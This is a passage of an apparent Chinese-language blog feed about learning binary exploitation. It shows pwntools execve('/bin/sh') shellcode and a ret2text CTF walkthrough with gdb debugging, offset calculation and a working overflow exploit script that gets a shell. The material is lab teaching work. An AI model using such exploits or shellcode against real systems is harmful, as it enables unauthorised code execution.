class=&#34;number&#34;&gt;0xf7fbb000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xf7fbd000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x1d5000&lt;/span&gt; r-x /lib/i386-linux-gnu/libc&lt;span class=&#34;number&#34;&gt;-2.27&lt;/span&gt;.so&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xf7fbd000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xf7fbe000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x1d7000&lt;/span&gt; rwx /lib/i386-linux-gnu/libc&lt;span class=&#34;number&#34;&gt;-2.27&lt;/span&gt;.so&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xf7fbe000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xf7fc1000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000000&lt;/span&gt; rwx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xf7fd0000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xf7fd2000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000000&lt;/span&gt; rwx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xf7fd2000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xf7fd5000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000000&lt;/span&gt; r-- [vvar]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xf7fd5000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xf7fd6000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000000&lt;/span&gt; r-x [vdso]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xf7fd6000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xf7ffc000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000000&lt;/span&gt; r-x /lib/i386-linux-gnu/ld&lt;span class=&#34;number&#34;&gt;-2.27&lt;/span&gt;.so&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xf7ffc000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xf7ffd000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x025000&lt;/span&gt; r-x /lib/i386-linux-gnu/ld&lt;span class=&#34;number&#34;&gt;-2.27&lt;/span&gt;.so&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xf7ffd000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xf7ffe000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x026000&lt;/span&gt; rwx /lib/i386-linux-gnu/ld&lt;span class=&#34;number&#34;&gt;-2.27&lt;/span&gt;.so&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xfffdd000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xffffe000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000000&lt;/span&gt; rwx [&lt;span class=&#34;built_in&#34;&gt;stack&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;方法二:readelf&lt;/p&gt;
&lt;h2 id=&#34;pwntools中的shellcode相关函数&#34;&gt;&lt;a href=&#34;#pwntools中的shellcode相关函数&#34; class=&#34;headerlink&#34; title=&#34;pwntools中的shellcode相关函数&#34;&gt;&lt;/a&gt;pwntools中的shellcode相关函数&lt;/h2&gt;&lt;p&gt;shellcraft.sh() 汇编代码的shellcode&lt;/p&gt;
&lt;p&gt;asm(shellcraft.sh())  二进制机器码(16进制)的shellcode&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;shellcraft.sh()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/* execve(path=&amp;#x27;/bin///sh&amp;#x27;, argv=[&amp;#x27;sh&amp;#x27;], envp=0) */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    /* push b&amp;#x27;/bin///sh\x00&amp;#x27; */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    push 0x68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    push 0x732f2f2f&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    push 0x6e69622f&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mov ebx, esp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    /* push argument array [&amp;#x27;sh\x00&amp;#x27;] */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    /* push &amp;#x27;sh\x00\x00&amp;#x27; */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    push 0x1010101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    xor dword ptr [esp], 0x1016972&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    xor ecx, ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    push ecx /* null terminate */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    push 4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pop ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    add ecx, esp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    push ecx /* &amp;#x27;sh\x00&amp;#x27; */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mov ecx, esp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    xor edx, edx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    /* call execve() */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    push SYS_execve /* 0xb */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pop eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int 0x80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;asm(shellcraft.sh()) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

</content>
        <category term="PWN入门" />
        <updated>2022-10-13T13:12:12.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/</id>
        <title>pwn入门-1-初识</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/"/>
        <content type="html">&lt;p&gt;​	学pwn有一段时间了,反反复复捣鼓一些东西,还是觉得以博客记录比较好,梳理自己的思路,会以第一人称来写,来记录学习的过程和结局思路(不是那种我是老师,教你学, 而是自己在探索.所以可能有时候会比较傻) 基础知识总有书和博客比我写得好,我觉得没有必要造轮子,所以有些基础知识可能会不会写的太细….反之,有一些博客上漏掉的细节,以及解题的关键会重点写(不会吧不会吧,真有人看你博客吗)&lt;/p&gt;
&lt;p&gt;​	自己曾经说网上99%的博客都是垃圾(包括自己的),希望自己换了新博客后写的能质量高一点(至少越来越有长进)。(笑,不会真有人看你博客吧?)&lt;/p&gt;
&lt;p&gt;​	第一篇文章首先来简单说一下自己目前认知的pwn&lt;/p&gt;
&lt;h2 id=&#34;什么是pwn&#34;&gt;&lt;a href=&#34;#什么是pwn&#34; class=&#34;headerlink&#34; title=&#34;什么是pwn?&#34;&gt;&lt;/a&gt;什么是pwn?&lt;/h2&gt;&lt;p&gt;​	简单来说就是二进制漏洞的利用,什么是二进制呢? 这里的二进制指的是二进制程序,也就是我们平常用高级语言编写的程序被编译链接后成为的01010101, 它们在操作系统中运行的时候,会因为操作系统和cpu等设计的问题,以及程序员的问题,出现各种bug,导致漏洞利用.&lt;/p&gt;
&lt;p&gt;​	最常见的就是溢出类型的漏洞,在CTF中也是最常考察的,栈溢出,堆溢出等,在这之后会有虚拟化逃逸,内核漏洞等.&lt;/p&gt;
&lt;p&gt;​	“万物皆可pwn”,尤其是现在iot的发展,多种设备都联入网络,像汽车,智能家居,安保系统等,都可能被“pwn“掉&lt;/p&gt;
&lt;h2 id=&#34;如何入门&#34;&gt;&lt;a href=&#34;#如何入门&#34; class=&#34;headerlink&#34; title=&#34;如何入门?&#34;&gt;&lt;/a&gt;如何入门?&lt;/h2&gt;&lt;p&gt;​	这个问题我没法回答,因为我现在正在入门……….我只能说一些我目前正在做的事情,仅供参考&lt;/p&gt;
&lt;h3 id=&#34;1-系统地打好计算机基础&#34;&gt;&lt;a href=&#34;#1-系统地打好计算机基础&#34; class=&#34;headerlink&#34; title=&#34;1.系统地打好计算机基础&#34;&gt;&lt;/a&gt;1.系统地打好计算机基础&lt;/h3&gt;&lt;p&gt;​	pwn和web不一样,是比较底层的,需要的计算机知识很多,基础不牢地动山摇,所以要有较好的计算机基础.&lt;/p&gt;
&lt;p&gt;​	包括但不限于 操作系统、汇编语言、体系结构、编译原理、C语言等&lt;/p&gt;
&lt;p&gt;​	作者目前研一,还有一段时间用来打基础,建议大家在本科期间就好好打基础呀 (半路出家的痛)&lt;/p&gt;
&lt;p&gt;​	目前选了学校的一些课程,同时在看一些书和视频等&lt;/p&gt;
&lt;h4 id=&#34;一-计算机体系结构&#34;&gt;&lt;a href=&#34;#一-计算机体系结构&#34; class=&#34;headerlink&#34; title=&#34;(一)计算机体系结构&#34;&gt;&lt;/a&gt;(一)计算机体系结构&lt;/h4&gt;&lt;p&gt;​	或者说计算机组成原理,是非常非常基础和重要的(本科时候学的太烂的),国科大的胡伟武老师讲这门课(放弃申报院士,为国家做芯片,龙芯董事长,首席科学家!!!! 超级牛的老师)&lt;/p&gt;
&lt;p&gt;​	这门课能让你懂计算机的运行原理,CPU的原理,计算机是如何工作的,从电路、元器件的原理上去深入理解计算机&lt;/p&gt;
&lt;p&gt;​	推荐书籍: &lt;/p&gt;
&lt;p&gt;《计算机体系结构基础 第三版》 胡伟武 这是给国科大的本科生看的,但我觉得不论什么水平看一看都有收获&lt;/p&gt;
&lt;p&gt;《计算机体系结构 第二版》胡伟武          这是给研究生推荐的教材,可以作为进阶看&lt;/p&gt;
&lt;p&gt;《深入理解计算机系统》     经典黑书..&lt;/p&gt;
&lt;h4 id=&#34;二-操作系统&#34;&gt;&lt;a href=&#34;#二-操作系统&#34; class=&#34;headerlink&#34; title=&#34;(二)操作系统&#34;&gt;&lt;/a&gt;(二)操作系统&lt;/h4&gt;&lt;p&gt;​	操作系统可以说&lt;/p&gt;
&lt;h2 id=&#34;从最简单的一个栈溢出开始了解pwn&#34;&gt;&lt;a href=&#34;#从最简单的一个栈溢出开始了解pwn&#34; class=&#34;headerlink&#34; title=&#34;从最简单的一个栈溢出开始了解pwn&#34;&gt;&lt;/a&gt;从最简单的一个栈溢出开始了解pwn&lt;/h2&gt;&lt;h2 id=&#34;什么是栈&#34;&gt;&lt;a href=&#34;#什么是栈&#34; class=&#34;headerlink&#34; title=&#34;什么是栈?&#34;&gt;&lt;/a&gt;什么是栈?&lt;/h2&gt;&lt;p&gt;​	栈是用来存储用户输入,函数变量,寄存器的值等的一块内存空间,它从高地址向低地址生长&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20221011171330747.png&#34; alt=&#34;图片描述&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;什么是缓冲区溢出&#34;&gt;&lt;a href=&#34;#什么是缓冲区溢出&#34; class=&#34;headerlink&#34; title=&#34;什么是缓冲区溢出?&#34;&gt;&lt;/a&gt;什么是缓冲区溢出?&lt;/h3&gt;&lt;p&gt;​	在上图中, buffer是&lt;font color=&#34;red&#34;&gt;用户能够可控的&lt;/font&gt;,用户能够可控的事实上便不安全,如果没有对buffer的大小进行正确的控制,buffer超过了128字节,则会产生溢出.&lt;/p&gt;
&lt;p&gt;​	那么产生了溢出又会怎样呢? 先看最直接的效果,buffer的地址是从低地址向高地址生长的,那么它往上溢出,就会覆盖ebp和返回地址,以及等等.&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20221011171912415.png&#34; alt=&#34;image-20221011171912415&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;p&gt;​	那么覆盖了又会怎样呢?? 这里就需要了解函数调用的基础了(基础知识很重要!),这里先简单的说,在我们当前这个函数被调用完成,进行return的时候,它会return到哪呢? 就是我们存储的&lt;font color=&#34;red&#34;&gt;返回地址(return address)&lt;/font&gt;,所以,答案就来了,如果我们把返回地址修改为恶意代码的地址,是不是就能够对它进行劫持? 是的,这种手法就叫劫持控制流&lt;/p&gt;
&lt;h3 id=&#34;一个简单的例子-ret2backdoor-x2F-ret2text&#34;&gt;&lt;a href=&#34;#一个简单的例子-ret2backdoor-x2F-ret2text&#34; class=&#34;headerlink&#34; title=&#34;一个简单的例子, ret2backdoor&amp;#x2F;ret2text&#34;&gt;&lt;/a&gt;一个简单的例子, ret2backdoor&amp;#x2F;ret2text&lt;/h3&gt;&lt;p&gt;题目来源于bamboofox中的ret2text&lt;/p&gt;
&lt;p&gt;题目链接:&lt;/p&gt;
&lt;p&gt;​	一般我们拿到的都是二进制文件,没有源代码,但我们不能直接读01吧,读汇编也很难吧(大佬除外),所以我们需要工具来帮我们反编译反汇编,反汇编是把01那些转换成汇编代码,反编译是把汇编转换成高级语言(如c语言)&lt;/p&gt;
&lt;p&gt;​	这时候我们需要借助一个工具, ida pro, 别的工具也可以,不过ida确实是非常好用啊&lt;/p&gt;
&lt;p&gt;​	&lt;/p&gt;
&lt;h4 id=&#34;动态调试&#34;&gt;&lt;a href=&#34;#动态调试&#34; class=&#34;headerlink&#34; title=&#34;动态调试&#34;&gt;&lt;/a&gt;动态调试&lt;/h4&gt;&lt;p&gt;​	啥是动态调试呢? 静态分析是看源程序的汇编代码,程序是死的,动态调试就是让程序跑起来,在程序运行的时候,在某个节点断下来,查看程序的运行时状态,如栈的布局,寄存器等等,来寻找漏洞和探索利用方式,这里同样我们要用一些工具,首先是gdb,gdb本身不是为了漏洞利用而生的,而是给程序员来调试程序用的.&lt;/p&gt;
&lt;p&gt;​	(这里还需要安装一个插件, gef ,具体安装可以google,有很多安装教程,或者直接看github仓库)   不过,为啥要安插件呢? 因为没插件不好用,插件能够帮你提取重要信息,以及给你增加很多方便漏洞调试的命令.&lt;/p&gt;
&lt;p&gt;​	我们用 gdb 文件名 来启动调试&lt;/p&gt;
&lt;p&gt;​	start 从第一条指令开始运行&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20221011173542682.png&#34; alt=&#34;image-20221011173542682&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	ni 一步一步往下执行(遇到函数时不进入,直接执行完)&lt;/p&gt;
&lt;p&gt;这里我们执行到了gets函数,它就是用来读取我们用户输入的,我们先来随便输入一串a&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20221011173723873.png&#34; alt=&#34;image-20221011173723873&#34; style=&#34;zoom:50%;&#34;&gt;



&lt;p&gt;telescope 查看栈的情况  连续按回车可以一直往下展示栈(其实是重复当前命令)&lt;/p&gt;
&lt;p&gt;能够看到 esp提示你 0xffffd56c这个位置存储的是这一串a,往下看,确实是,&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20221011173849858.png&#34; alt=&#34;image-20221011173849858&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;p&gt;当我们继续往下看的时候,我们看到了ebp&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20221011173946237.png&#34; alt=&#34;image-20221011173946237&#34; style=&#34;zoom:50%;&#34;&gt;



&lt;p&gt;根据我们上面对栈的理解,buf之后是ebp然后是返回地址 (实际上实际情况可能比这还要复杂,暂且这样)&lt;/p&gt;
&lt;p&gt;所以我们也可以从这里算覆盖地址,用ebp的地址 - 字符串开头,也就是buffer的地址, 就可以算出来要填充的字节数&lt;/p&gt;
&lt;p&gt;0xffffd5d8 - 0xffffd56c &amp;#x3D; 108 这是到ebp的, 再加上ebp 4个字节,于是就是 112 字节, 然后就是返回地址了&lt;/p&gt;
&lt;p&gt;那么返回地址我们返回到哪呢? 我们刚才在静态分析的时候已经分析到了存在后门函数,地址是0x804863a,所以我们返回这个后门的地址就可以了!&lt;/p&gt;
&lt;p&gt;&lt;font color=&#34;red&#34;&gt;ctfwiki里解释的太粗了,为什么eax的位置就是字符串开始读取的位置呢????????? &lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20230218154658066.png&#34; alt=&#34;image-20230218154658066&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;构造payload与exp&#34;&gt;&lt;a href=&#34;#构造payload与exp&#34; class=&#34;headerlink&#34; title=&#34;构造payload与exp&#34;&gt;&lt;/a&gt;构造payload与exp&lt;/h4&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload =  &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;108&lt;/span&gt; + &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;  + retaddress&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// &lt;span class=&#34;number&#34;&gt;108&lt;/span&gt;是覆盖缓冲区,&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;是覆盖ebp,然后就是返回地址了&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;ret2text&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;retaddress = &lt;span class=&#34;number&#34;&gt;0x804863a&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = payload =  &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;108&lt;/span&gt; + &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;  + p32(retaddress)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM&lt;span class=&#34;number&#34;&gt;-24&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-10&lt;/span&gt;-ubuntu:/home/ubuntu/zhan# python3 &lt;span class=&#34;built_in&#34;&gt;exp&lt;/span&gt;.py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[!] Could not find executable &lt;span class=&#34;string&#34;&gt;&amp;#x27;ret2text&amp;#x27;&lt;/span&gt; in $PATH, using &lt;span class=&#34;string&#34;&gt;&amp;#x27;./ret2text&amp;#x27;&lt;/span&gt; instead&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Starting local process &lt;span class=&#34;string&#34;&gt;&amp;#x27;./ret2text&amp;#x27;&lt;/span&gt;: pid &lt;span class=&#34;number&#34;&gt;16542&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Switching to interactive mode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;There is something amazing here, &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt; you know anything?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ id&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Maybe I will tell you next time !$ whoami&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ ls&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;exp&lt;/span&gt;.py    ret2text  shellcode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;于是我们就拿到权限了!&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;h2 id=&#34;关于和pwntools的联动问题&#34;&gt;&lt;a href=&#34;#关于和pwntools的联动问题&#34; class=&#34;headerlink&#34; title=&#34;关于和pwntools的联动问题&#34;&gt;&lt;/a&gt;关于和pwntools的联动问题&lt;/h2&gt;&lt;p&gt;sh.send(payload)&lt;br&gt;pause()&lt;/p&gt;
&lt;p&gt;想达到在刚发送完这条payload,查看之后的效果,如果这样的话,是不行的,这样的话估计是执行了很多条之后的了,为什么呢?&lt;/p&gt;
&lt;p&gt;如果想达到上述效果,需要下断点. 先调试找到断点,然后在gdb.attach的时候下断点&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xf7e4c624&lt;/span&gt; &amp;lt;gets+&lt;span class=&#34;number&#34;&gt;292&lt;/span&gt;&amp;gt;    call   __uflow                    &amp;lt;__uflow&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xf7e4c629&lt;/span&gt; &amp;lt;gets+&lt;span class=&#34;number&#34;&gt;297&lt;/span&gt;&amp;gt;    add    esp, &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;下断点下到0xf7e4c629就可以了&lt;/p&gt;
